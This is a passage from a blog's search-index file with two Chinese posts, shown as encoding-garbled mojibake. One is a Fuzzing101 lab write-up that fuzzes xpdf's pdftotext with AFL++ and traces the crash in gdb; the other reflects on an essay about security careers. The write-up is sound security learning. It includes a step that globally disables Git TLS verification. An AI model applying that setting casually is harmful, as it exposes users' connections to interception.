æ˜¯ä¸€ç§é¡µé¢æè¿°è¯­è¨€ï¼Œå¯ä»¥åœ¨æ‰“å°æœºæˆ–å…¶ä»–è®¾å¤‡ä¸Šè¿›è¡Œæ¸²æŸ“å’Œæ‰“å°</li><li>pdftotextï¼šç”¨äºå°† PDF æ–‡ä»¶ä¸­çš„æ–‡æœ¬æå–ä¸ºçº¯æ–‡æœ¬æ ¼å¼</li></ul><p>æ¥ä¸‹æ¥å®‰è£…AFL++</p><p>ç¬¬ä¸€æ¡å®‰è£…å‘½ä»¤ç”¨äºå®‰è£…æ„å»ºè½¯ä»¶åŒ…ï¼ˆ<code>build-essential</code>ï¼‰ã€Python 3 å¼€å‘åº“ï¼ˆ<code>python3-dev</code>ï¼‰ã€è‡ªåŠ¨æ„å»ºå·¥å…·ï¼ˆ<code>automake</code>ï¼‰ã€ç‰ˆæœ¬æ§åˆ¶å·¥å…· Gitï¼ˆ<code>git</code>ï¼‰ã€è¯æ³•åˆ†æå™¨ç”Ÿæˆå™¨ Flexï¼ˆ<code>flex</code>ï¼‰ã€è¯­æ³•åˆ†æå™¨ç”Ÿæˆå™¨ Bisonï¼ˆ<code>bison</code>ï¼‰ã€GLib å¼€å‘åº“ï¼ˆ<code>libglib2.0-dev</code>ï¼‰ã€åƒç´ ç®¡ç†åº“ Pixman å¼€å‘åº“ï¼ˆ<code>libpixman-1-dev</code>ï¼‰ä»¥åŠ Python 3 çš„ setuptoolsã€‚</p><p>ç¬¬äºŒæ¡å®‰è£…å‘½ä»¤ç”¨äºå®‰è£… LLVM å’Œ Clang </p><p>ç¬¬ä¸‰æ¡å®‰è£…å‘½ä»¤æ ¹æ®ç³»ç»Ÿä¸Šå·²å®‰è£…çš„ GCC ç‰ˆæœ¬ï¼Œå®‰è£…ç›¸åº”çš„æ’ä»¶å¼€å‘åŒ…å’Œ libstdc++ å¼€å‘åº“</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-dev<br></code></pre></td></tr></table></figure><p>æ¥ç€å®‰è£…AFL++å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-variable">$HOME</span><br>git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-built_in">cd</span> AFLplusplus<br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br>make distrib<br>sudo make install<br></code></pre></td></tr></table></figure><p>æ­¤å¤„é‡åˆ°ä¸€ä¸ªæŠ¥é”™ï¼š</p><p><img src="/2023/07/09/Exercise1/image-20230709105123404.png" alt="image-20230709105123404"></p><p>å¯ä»¥é€šè¿‡ç¦ç”¨SSLè¯ä¹¦è§£å†³ï¼Œä½†ä¼šé™ä½å®‰å…¨æ€§ï¼Œéœ€è¦åœ¨å¯é çš„ç½‘ç»œç¯å¢ƒä¸­æ“ä½œ</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> install gnutls-bin<br>git<span class="hljs-built_in"> config </span>--global http.sslVerify <span class="hljs-literal">false</span><br>git<span class="hljs-built_in"> config </span>--global http.postBuffer 1048576000<br></code></pre></td></tr></table></figure><p>è‡³æ­¤AFLå®‰è£…å®Œæˆï¼Œå¯ä»¥è¾“å…¥ <code>afl-fuzz</code>å¾—åˆ°å¦‚ä¸‹è¾“å‡º</p><p><img src="/2023/07/09/Exercise1/image-20230709151638679.png" alt="image-20230709151638679"></p><p>é€šè¿‡å‘½ä»¤ï¼Œå¯ä»¥å¯¹pdftotextè¿›è¡Œæµ‹è¯•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤ä½¿ç”¨ AFL å·¥å…·å¯¹ pdftotext ç¨‹åºè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚å®ƒä»æŒ‡å®šçš„è¾“å…¥æ–‡ä»¶å¤¹ä¸­è·å–æµ‹è¯•æ ·æœ¬ï¼Œå°† AFL è¾“å‡ºç»“æœä¿å­˜åˆ°outä¸­ã€‚ä½¿ç”¨éšæœºæ•°ç§å­ 123ï¼Œæµ‹è¯• pdftotext ç¨‹åºï¼Œå¹¶å°†ç¨‹åºçš„è¾“å‡ºç»“æœä¿å­˜åˆ°outputä¸­</p><p>ç­‰å¾…ç¨‹åºè¿è¡Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼Œçº¢è‰²çš„ä¸ºå‘ç°çš„å´©æºƒ</p><p><img src="/2023/07/09/Exercise1/image-20230709215359532.png" alt="image-20230709215359532"></p><p>è¿è¡Œå‘½ä»¤ï¼Œ<code>-g</code> é€‰é¡¹ç”¨äºåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ç”Ÿæˆè°ƒè¯•ç¬¦å·ä¿¡æ¯ï¼Œè€Œ <code>-O0</code> é€‰é¡¹åˆ™æŒ‡ç¤ºç¼–è¯‘å™¨ç¦ç”¨ä¼˜åŒ–ã€‚</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">make clean<br><span class="hljs-attribute">CFLAGS</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> CXXFLAGS<span class="hljs-operator">=</span><span class="hljs-string">&quot;-g -O0&quot;</span> ./configure --prefix<span class="hljs-operator">=</span><span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>è¿è¡Œgdbï¼Œæ­¤å¤„çš„your filenameåº”è¯¥å¡«å†™crashesæ–‡ä»¶å¤¹ä¸­çš„ï¼ŒåŒ…å«æŠ¥é”™ä¿¡æ¯çš„æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>out<span class="hljs-regexp">/default/</span>crashes<span class="hljs-regexp">/&lt;your filename&gt; $HOME/</span>fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><p>è¾“å…¥runæˆ–è€…ræ¥è¿è¡Œï¼Œå¯ä»¥å¾—åˆ°é”™è¯¯ä¿¡æ¯ï¼Œç¨‹åºæ”¶åˆ°äº†SIGSEGVä¿¡å·ï¼Œä¹Ÿç§°ä¸ºåˆ†æ®µé”™è¯¯ï¼ˆSegmentation faultï¼‰ã€‚è¿™ç§é”™è¯¯é€šå¸¸æ˜¯ç”±äºè®¿é—®æ— æ•ˆçš„å†…å­˜åœ°å€å¯¼è‡´çš„ã€‚</p><p><img src="/2023/07/09/Exercise1/image-20230716150720853.png" alt="image-20230716150720853"></p><p>é€šè¿‡btå‘½ä»¤è¿›è¡Œå›æº¯ï¼Œå¯ä»¥çœ‹åˆ°åå¤è¿›è¡Œäº†getobjå’Œmakestreamçš„è°ƒç”¨</p><p><img src="/2023/07/09/Exercise1/image-20230716153423406.png" alt="image-20230716153423406"></p><p>ä¸‹è½½å®˜æ–¹ä¿®å¤äº†è¯¥é—®é¢˜çš„Xpdf4.02å‘ç°ï¼Œä¸æ­¤ç‰ˆæœ¬ç›¸æ¯”ï¼Œæ·»åŠ äº†ä¸€ä¸ªè®°å½•å¾ªç¯æ¬¡æ•°çš„å˜é‡ï¼Œè§£å†³è¯¥é—®é¢˜</p><p>æ—§ï¼š</p><p><img src="/2023/07/09/Exercise1/image-20230716153759316.png" alt="image-20230716153759316"></p><p>æ–°ï¼š</p><p><img src="/2023/07/09/Exercise1/image-20230716154017601.png" alt="image-20230716154017601"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ­¤æ¬¡å®éªŒäº†è§£äº†æ¨¡ç³Šæµ‹è¯•å™¨åŠŸèƒ½ï¼Œé€šè¿‡ç§å­çš„å˜å¼‚å’Œç»„åˆä¸æ–­å¯¹pdftotextè¿™ä¸ªç¨‹åºè¿›è¡Œæµ‹è¯•ã€‚åŒæ—¶ä¹Ÿç†Ÿæ‚‰äº†gdbçš„ç›¸å…³æ“ä½œä»¥åŠæå‡äº†ä¸€å®šçš„ç¨‹åºæµåˆ†æèƒ½åŠ›ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Fuzzing101</category>
      
    </categories>
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¯»åæ„Ÿï¼šSo you want to work in security?</title>
    <link href="/2023/07/07/ReflectionPeper/"/>
    <url>/2023/07/07/ReflectionPeper/</url>
    
    <content type="html"><![CDATA[<h2 id="è¯»åæ„Ÿï¼šSo-you-want-to-work-in-security"><a href="#è¯»åæ„Ÿï¼šSo-you-want-to-work-in-security" class="headerlink" title="è¯»åæ„Ÿï¼šSo you want to work in security?"></a>è¯»åæ„Ÿï¼šSo you want to work in security?</h2><p><a href="http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html">So you want to work in security?</a></p><h3 id="å¾—å¿™èµ·æ¥"><a href="#å¾—å¿™èµ·æ¥" class="headerlink" title="å¾—å¿™èµ·æ¥"></a>å¾—å¿™èµ·æ¥</h3><p>å¯¹äºè¿™ç¯‡åšå®¢ï¼Œæˆ‘æ›´æ„¿æ„å°†å…¶è§†ä½œä¸€ä¸ªçº æ­£æˆ‘æš‘æœŸï¼Œæˆ–æ˜¯è¯´æ¯•ä¸šä¹‹åçš„ä¸€ä¸ªè¾ƒä¸ºæ¾æ‡ˆçš„å­¦ä¹ æ€åº¦ä»¥åŠå¼€å­¦å‰ä»¥ä½•ç§å­¦ä¹ æ–¹å¼å»è¡¥å……è‡ªå·±çš„ä¸è¶³çš„ä¸€ç¯‡æ–‡ç« ã€‚</p><p>æ˜¾ç„¶ï¼Œæœ¬ç§‘æ¯•ä¸šç¡®å®ç»™æˆ‘å¸¦æ¥äº†ä¸€äº›å¯èƒ½ä¸æˆ‘å¹¶ä¸ç›¸ç§°çš„å¿«ä¹ï¼Œå³å…¶å®æˆ‘ç®—æ˜¯é€‰æ‹©å¤§äºåŠªåŠ›çš„é‚£ä¸€éƒ¨åˆ†äººï¼Œåœ¨è€ƒç ”è¿‡ç¨‹ä¸­æˆ‘å¹¶æœªä»˜å‡ºå’Œå…¶ä»–äººé‚£èˆ¬çš„åŠªåŠ›ï¼Œæ‰€ä»¥å…¶å®æ›´åº”è¯¥çœ‹åˆ°è‡ªå·±ä¸åˆ«äººçš„å·®è·ï¼Œè®©æˆ‘å¿«è¦ç”Ÿé”ˆçš„è„‘å­è½¬èµ·æ¥ã€‚</p><h3 id="ä»»é‡é“è¿œ"><a href="#ä»»é‡é“è¿œ" class="headerlink" title="ä»»é‡é“è¿œ"></a>ä»»é‡é“è¿œ</h3><p>å®‰å…¨æ–¹å‘æ‰€æ¶‰åŠçš„çŸ¥è¯†é¢çš„å¹¿åº¦ï¼Œåœ¨æˆ‘æµ…è–„çš„è®¤çŸ¥é‡Œï¼Œæˆ‘è®¤ä¸ºæ˜¯å¤§äºå…¶ä»–æ–¹å‘çš„ã€‚è¿™ä¸€ç‚¹å…¶å®æ—©æœŸåœ¨è“é²¸çŸ­æš‚å­¦ä¹ çš„æ—¶å€™å°±æ„Ÿå—è¿‡äº†ã€‚è€Œå…¶å®è¿™ä¹Ÿæ˜¯æˆ‘åœ¨æ–‡ä¸­æ„Ÿè§‰è¢«ç‹ ç‹ æ‰“è„¸çš„ä¸€éƒ¨åˆ†ã€‚â€œ<strong>Donâ€™t give up when you encounter things you donâ€™t understand</strong>â€æ–‡ä¸­å¦‚æ˜¯è¯´ï¼Œå…¶å®åŸæ¥æˆ‘å¾ˆæœ‰å¹¸çš„æ‰›è¿‡äº†è“é²¸ç­›é€‰çš„ç¬¬ä¸€é˜¶æ®µï¼Œä½†éšç€éš¾åº¦ä¸Šå‡ï¼Œæˆ‘é€ƒé¿äº†ã€‚å¾ˆæˆè°‘çš„ï¼ŒæŸå­¦é•¿å°±åœ¨äº¤æµä¸­é—®è¿‡ï¼šâ€œè¿™å›å­¦ä¸å­¦çš„ä¸‹å»â€ã€‚æˆ‘è®¤ä¸ºè¿™ä¸€ç‚¹ç¡®å®ä¹Ÿæ˜¯æˆ‘éœ€è¦å»å…‹æœçš„ã€‚</p><p>åŒæ—¶ï¼Œæ–‡ä¸­å†™åˆ°è¦å……åˆ†åˆ©ç”¨èµ„æºï¼Œå¯¹äºè¿™ä¸€ç‚¹ï¼Œæˆ‘è®¤ä¸ºåº”è¯¥æ˜¯å……åˆ†çš„åˆ©ç”¨æœ‰æ•ˆèµ„æºï¼Œæˆ–è€…è¯´æ˜¯å¦‚ä½•é«˜æ•ˆçš„åˆ©ç”¨èµ„æºå¤„ç†äºŸå¾…è§£å†³çš„é—®é¢˜ã€‚å…¶å®æ— è®ºä»æœ¬ç§‘çš„å­¦ä¹ è¿˜æ˜¯è¯´ä¹‹å‰çš„æ¯•è®¾æˆ–è€…æ˜¯è®ºæ–‡åˆ†äº«ï¼Œéƒ½å¯ä»¥çœ‹å‡ºï¼ŒæŸ¥æ‰¾å­¦ä¹ çŸ¥è¯†æ˜¯ä¸€ä¸ªç±»ä¼¼äºå‰¥æ´‹è‘±çš„è¿‡ç¨‹ï¼ŒæŸ¥æ‰¾Aä¸­å‘ç°æœ‰Bä¸æ‡‚ï¼Œé‚£ä¹ˆå†å»æ‰¾Bï¼Œå­¦ä¹ Bæ˜¯å‘ç°å…¶ä¸­å‡ºç°çš„Cï¼ŒDä¸æ¸…æ¥šï¼Œé‚£ä¹ˆå°±åº”è¯¥å…ˆå»æŠŠCï¼ŒDçœ‹æ‡‚ï¼Œå†ä¸€å±‚å±‚å¾€ä¸Šåç€æ¨ï¼Œæ— ç–‘è¿™ä¼šæ¶ˆè€—å¤§é‡æ—¶é—´ï¼Œä½†æ€»å½’æ˜¯è¦æ¯”ä¸€çŸ¥åŠè§£çš„äº†è§£Aæ˜¯ä»€ä¹ˆä¼šæ¥çš„æ›´æœ‰æ”¶è·ã€‚</p><h3 id="ä¿æŒæ€è€ƒ"><a href="#ä¿æŒæ€è€ƒ" class="headerlink" title="ä¿æŒæ€è€ƒ"></a>ä¿æŒæ€è€ƒ</h3><p>è¿™ä¸€ç‚¹ä¸ä»…æ˜¯è¯´æ˜¯ï¼Œå¦‚ä½•å»æå‡ºé—®é¢˜ï¼Œä¹Ÿæ˜¯é¢å¯¹ä¸€ä¸ªé—®é¢˜æ—¶ä½ èƒ½æ€ä¹ˆå»è§£å†³ã€‚å®‰å…¨æ–¹é¢ï¼Œè§£å†³é—®é¢˜éœ€è¦çµæ´»æ€§ï¼Œå¯èƒ½æœ¬ç§‘æœŸé—´ï¼Œå¤šæ•°æ—¶é—´æˆ‘ä»¬éƒ½åœ¨è·Ÿç€è¯¾æœ¬å­¦ä¹ æ‰€è°“çš„æ ‡å‡†ç­”æ¡ˆï¼Œä¹Ÿå°±æ˜¯æ–‡ä¸­æåˆ°çš„â€œIf you prefer to follow a pre-set curriculum, youâ€™re not going to get very far in securityâ€è·Ÿç€é¢„å®šçš„è¯¾ç¨‹èµ°ã€‚æˆ‘ç¡®å®ä¸å¦è®¤æˆ‘æ›´ä¹æ„å»æŒ‰ç€å®‰æ’åšäº‹å„¿ï¼Œç­”æ¡ˆè·Ÿç€æ ‡å‡†ç­”æ¡ˆèµ°ï¼Œä½†æˆ‘è§‰ç€ç¡®å®ä¹Ÿåº”è¯¥åšå‡ºä¸€äº›çªç ´äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Something interesting</category>
      
    </categories>
    
    
    <tags>
      
      <tag>read</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
